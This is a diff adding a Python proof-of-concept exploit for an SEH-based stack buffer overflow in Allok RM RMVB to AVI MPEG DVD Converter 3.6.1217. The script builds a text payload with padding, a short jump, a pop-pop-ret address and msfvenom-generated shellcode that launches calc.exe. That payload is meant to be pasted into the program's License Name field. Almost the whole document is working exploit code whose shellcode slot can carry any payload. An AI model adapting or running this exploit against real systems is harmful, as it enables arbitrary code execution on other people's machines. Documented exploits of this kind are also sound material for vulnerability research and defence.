@@ -1,0 +1,52 @@
+# Exploit Title: Allok RM RMVB to AVI MPEG DVD Converter 3.6.1217 - Stack Overflow (SEH)
+# Date: 2020-01-12
+# Exploit Author: Antonio de la Piedra
+# Vendor Homepage: https://www.alloksoft.com
+# Software Link: https://www.alloksoft.com/allok_rmconverter.exe
+# Version: 3.6.1217
+# Tested on: Windows 7 SP1 32-bit
+
+# Copy paste the contents of poc_seh.txt into the License Name input field
+# of  Allok RM RMVB to AVI MPEG DVD Converter 3.6.1217 to execute calc.exe.
+
+#!/usr/bin/python
+
+nseh_offset = 780
+total = 1000
+
+#  msfvenom -p windows/exec -b '\x00\x0a\x0d' -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread
+shellcode_calc =  b""
+shellcode_calc += b"\xdd\xc0\xbe\x48\x33\xfd\x23\xd9\x74\x24"
+shellcode_calc += b"\xf4\x5f\x33\xc9\xb1\x31\x83\xef\xfc\x31"
+shellcode_calc += b"\x77\x14\x03\x77\x5c\xd1\x08\xdf\xb4\x97"
+shellcode_calc += b"\xf3\x20\x44\xf8\x7a\xc5\x75\x38\x18\x8d"
+shellcode_calc += b"\x25\x88\x6a\xc3\xc9\x63\x3e\xf0\x5a\x01"
+shellcode_calc += b"\x97\xf7\xeb\xac\xc1\x36\xec\x9d\x32\x58"
+shellcode_calc += b"\x6e\xdc\x66\xba\x4f\x2f\x7b\xbb\x88\x52"
+shellcode_calc += b"\x76\xe9\x41\x18\x25\x1e\xe6\x54\xf6\x95"
+shellcode_calc += b"\xb4\x79\x7e\x49\x0c\x7b\xaf\xdc\x07\x22"
+shellcode_calc += b"\x6f\xde\xc4\x5e\x26\xf8\x09\x5a\xf0\x73"
+shellcode_calc += b"\xf9\x10\x03\x52\x30\xd8\xa8\x9b\xfd\x2b"
+shellcode_calc += b"\xb0\xdc\x39\xd4\xc7\x14\x3a\x69\xd0\xe2"
+shellcode_calc += b"\x41\xb5\x55\xf1\xe1\x3e\xcd\xdd\x10\x92"
+shellcode_calc += b"\x88\x96\x1e\x5f\xde\xf1\x02\x5e\x33\x8a"
+shellcode_calc += b"\x3e\xeb\xb2\x5d\xb7\xaf\x90\x79\x9c\x74"
+shellcode_calc += b"\xb8\xd8\x78\xda\xc5\x3b\x23\x83\x63\x37"
+shellcode_calc += b"\xc9\xd0\x19\x1a\x87\x27\xaf\x20\xe5\x28"
+shellcode_calc += b"\xaf\x2a\x59\x41\x9e\xa1\x36\x16\x1f\x60"
+shellcode_calc += b"\x73\xf8\xfd\xa1\x89\x91\x5b\x20\x30\xfc"
+shellcode_calc += b"\x5b\x9e\x76\xf9\xdf\x2b\x06\xfe\xc0\x59"
+shellcode_calc += b"\x03\xba\x46\xb1\x79\xd3\x22\xb5\x2e\xd4"
+shellcode_calc += b"\x66\xd6\xb1\x46\xea\x37\x54\xef\x89\x47"
+
+poc = ""
+poc += "A"*nseh_offset
+poc += "\xEB\x0b\x90\x90"   # jmp forward (nseh)
+poc +=  "\x11\x7b\x03\x10"  # pop pop ret (seh)
+poc += "\x90"*20
+poc += shellcode_calc
+poc += "D"*(total - len(poc))
+
+file = open("poc_seh.txt","w")
+file.write(poc)
+file.close()
